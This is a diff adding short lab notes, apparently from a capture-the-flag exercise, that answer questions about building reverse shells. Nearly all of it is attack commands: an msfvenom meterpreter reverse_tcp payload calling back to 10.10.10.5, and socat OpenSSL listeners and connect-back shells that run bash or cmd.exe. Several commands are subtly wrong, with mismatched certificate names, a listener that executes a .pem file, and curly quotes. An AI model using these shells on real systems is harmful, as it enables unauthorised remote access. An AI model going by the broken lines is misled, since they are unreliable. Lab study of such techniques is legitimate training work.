@@ -1,0 +1,15 @@
+The format for the shell is elf and the output filename should be shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
+
+What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
+
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+socat OPENSSL-LISTEN:53 FILE:tty,raw,echo=0,cert=encrypt.pem,verify=0
+socat openssl-listen:53,cert=encrypt.pem,verify=0 exec:shell.pem,pipes 
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Use port 53, and a PEM file called "encrypt.pem"
+If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+socat openssl:10.10.10.5:53,cert=shell.pem,verify=0 exec:cmd.exe,pipes 
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
